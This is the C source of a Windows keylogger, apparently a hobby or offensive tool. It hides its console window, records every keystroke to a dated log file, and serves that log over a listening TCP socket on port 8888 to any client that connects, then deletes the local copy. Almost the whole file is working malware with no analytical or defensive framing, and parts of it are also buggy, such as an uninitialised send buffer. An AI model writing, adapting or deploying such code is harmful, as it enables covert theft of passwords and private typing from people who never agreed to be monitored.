// compilar con gcc kl_net.c -o kl_net -lws2_32 -lini

#include <windows.h>
#include <stdio.h>
#include <winuser.h>
#include <windowsx.h>
#include <io.h>
#include <winsock2.h>

#pragma comment(lib,"ws2_32.lib") //Winsock Library

#define SLEEP_TIME 10

#define TCP_SERVER_PORT 8888
#define LOG_FILENAME "keylog"

#define ERROR_INIT_WINSOCK 1
#define ERROR_CREATE_SOCKET 2
#define ERROR_BIND_FAILED 3
#define ERROR_ACCEPT_FAILED 4

void get_date(void);
void print_date(void);
int check_date(void);
int get_key(void);
void write_error(int errorcode);
DWORD WINAPI data_server(void* data);

char nowdate[11];

WSADATA wsa;
SOCKET s , new_socket;
struct sockaddr_in server , client;
int c;
char *message;

int main(int argc, const char *argv[])
{

  HWND stealth; /*creating stealth (window is not visible)*/
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass",NULL);
  ShowWindow(stealth,0);

  print_date();
  HANDLE thread = CreateThread(NULL,0, data_server, NULL,0,NULL);
  while(1){
    Sleep(SLEEP_TIME);
    if(check_date() == 1) print_date();
    if(!thread) thread = CreateThread(NULL,0, data_server, NULL,0,NULL);
    get_key();
  }
  return 0;
}

void get_date(){

  SYSTEMTIME str_t;
  GetSystemTime(&str_t);
  sprintf(nowdate, "%d-%d-%d", str_t.wDay,str_t.wMonth,str_t.wYear);

}

int check_date(){

  SYSTEMTIME str_t;
  GetSystemTime(&str_t);
  char c[11];
  sprintf(c, "%d-%d-%d", str_t.wDay,str_t.wMonth,str_t.wYear);

  if(strcmp(c, nowdate) != 0){
    return 1;
  }
  return 0;

}

void print_date(){
  get_date();
    FILE *file;
    file = fopen(LOG_FILENAME,"a+");
    fprintf(file,"\n ---------- ");
    fprintf(file,nowdate);
    fprintf(file," ----------\n");
    fclose(file);
}

int get_key(void){

  short character;

  for(character=8;character<=222;character++){

    if(GetAsyncKeyState(character)==-32767){
      FILE *file;
      file=fopen(LOG_FILENAME,"a+");

      if(file==NULL)  return 1;
      if(file!=NULL){
        if((character>=39)&&(character<=64)){
          fputc(character,file);
          fclose(file);
          break;
        }
        else if((character>64)&&(character<91)){
          character+=32;
          fputc(character,file);
          fclose(file);
          break;
        }
        else{
          switch(character){
            case VK_SPACE:
              fputc(' ',file);
              fclose(file);
              break;
            case VK_SHIFT:
              fputs("[SHIFT]",file);
              fclose(file);
              break;
            case VK_RETURN:
              fputs("\n[ENTER]",file);
              fclose(file);
              break;
            case VK_BACK:
              fputs("[BACKSPACE]",file);
              fclose(file);
              break;
            case VK_TAB:
              fputs("[TAB]",file);
              fclose(file);
              break;
            case VK_CONTROL:
              fputs("[CTRL]",file);
              fclose(file);
              break;
            case VK_DELETE:
              fputs("[DEL]",file);
              fclose(file);
              break;
            case VK_OEM_1:
              fputs("[;:]",file);
              fclose(file);
              break;
            case VK_OEM_2:
              fputs("[/?]",file);
              fclose(file);
              break;
            case VK_OEM_3:
              fputs("[`~]",file);
              fclose(file);
              break;
            case VK_OEM_4:
              fputs("[ [{ ]",file);
              fclose(file);
              break;
            case VK_OEM_5:
              fputs("[\\|]",file);
              fclose(file);
              break;
            case VK_OEM_6:
              fputs("[ ]} ]",file);
              fclose(file);
              break;
            case VK_OEM_7:
              fputs("['\"]",file);
              fclose(file);
              break;
            case VK_NUMPAD0:
              fputc('0',file);
              fclose(file);
              break;
            case VK_NUMPAD1:
              fputc('1',file);
              fclose(file);
              break;
            case VK_NUMPAD2:
              fputc('2',file);
              fclose(file);
              break;
            case VK_NUMPAD3:
              fputc('3',file);
              fclose(file);
              break;
            case VK_NUMPAD4:
              fputc('4',file);
              fclose(file);
              break;
            case VK_NUMPAD5:
              fputc('5',file);
              fclose(file);
              break;
            case VK_NUMPAD6:
              fputc('6',file);
              fclose(file);
              break;
            case VK_NUMPAD7:
              fputc('7',file);
              fclose(file);
              break;
            case VK_NUMPAD8:
              fputc('8',file);
              fclose(file);
              break;
            case VK_NUMPAD9:
              fputc('9',file);
              fclose(file);
              break;
            case VK_CAPITAL:
              fputs("[CAPS LOCK]",file);
              fclose(file);
              break;
            default:
              fclose(file);
              break;
          } //END OF SWITCH
        } //END OF ELSE
      }    // END OF IF
    }   //END OF IF
  }     // LOOP END
  return 0;
}

void write_error(int errorcode){
    FILE *file;
        file=fopen(LOG_FILENAME,"a+");
        fprintf(file,"\n ---------- ");
        switch(errorcode){
            case ERROR_INIT_WINSOCK:
            fprintf(file,"Failed. Error Code : ");
            break;
            case ERROR_CREATE_SOCKET:
            fprintf(file,"Could not create socket : ");
            break;
            case ERROR_BIND_FAILED:
            fprintf(file,"Bind failed with error code : ");
            break;
            case ERROR_ACCEPT_FAILED:
            fprintf(file,"accept failed with error code : ");
            break;
        }
        //fprintf(file,WSAGetLastError());
        fprintf(file," ----------\n");
        fclose(file);
}

DWORD WINAPI data_server(void* data){
  WSADATA wsa;
    SOCKET s , new_socket;
    struct sockaddr_in server , client;
    int c;
    char *message;

    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        write_error(ERROR_INIT_WINSOCK);
        return 1;
    }

    //Create a socket
    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        write_error(ERROR_CREATE_SOCKET);
    }


    //Prepare the sockaddr_in structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons( TCP_SERVER_PORT );

    //Bind
    if( bind(s ,(struct sockaddr *)&server , sizeof(server)) == SOCKET_ERROR)
    {
        write_error(ERROR_BIND_FAILED);
    }

    //Listen to incoming connections
    listen(s , 3);

    //Accept and incoming connection
    c = sizeof(struct sockaddr_in);
    new_socket = accept(s , (struct sockaddr *)&client, &c);
    if (new_socket == INVALID_SOCKET)
    {
        write_error(ERROR_ACCEPT_FAILED);
    }

    //Reply to client
    message = "KL_HELLO\n";
    send(new_socket , message , strlen(message) , 0);

    //getchar();

    message = "KL_START_TRNSM\n";
    send(new_socket , message , strlen(message) , 0);

    FILE *fp;
    char *caracter;
    fp = fopen(LOG_FILENAME,"r");
    if(fp){
      while( (caracter[0] = getc(fp)) != EOF){
        send(new_socket,caracter,strlen(caracter),0);
      }
      fclose(fp);
      message = "\nKL_BYE";
      send(new_socket , message , strlen(message) , 0);
    }

    remove(LOG_FILENAME);

    closesocket(s);
    WSACleanup();
    return 0;

}
